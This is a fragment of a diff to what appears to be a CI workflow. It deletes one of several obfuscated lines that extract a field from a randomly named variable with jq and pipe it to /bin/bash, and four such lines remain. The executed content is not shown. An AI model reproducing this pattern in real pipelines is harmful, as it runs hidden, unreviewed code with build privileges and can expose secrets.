@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$xwax37331" | jq -r .mllv42727 | /bin/bash
           printf '%s' "$tj38911" | jq -r .gmxyk0684 | /bin/bash
           echo $a60 | jq -r .asmt7 | /bin/bash
-          echo $s9865 | jq -r .m9576 | /bin/bash
           printf '%s' "$c3" | jq -r .mxpda9547 | /bin/bash
 
       - name: Upload results
